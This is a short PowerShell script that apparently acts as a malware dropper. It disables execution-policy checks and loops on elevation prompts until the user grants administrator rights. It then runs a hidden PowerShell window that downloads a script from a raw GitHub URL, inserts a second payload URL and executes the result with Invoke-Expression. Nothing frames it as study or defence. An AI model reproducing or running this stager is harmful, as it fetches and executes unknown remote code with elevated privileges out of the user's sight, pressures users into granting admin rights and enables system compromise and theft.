Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
$command = "C:\Windows\System32\cmd.exe"
while($true)
 {
	 try
  {  
    Start-Process 'powershell' -Verb runas -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`"";exit
     
	}
    catch{}   
}
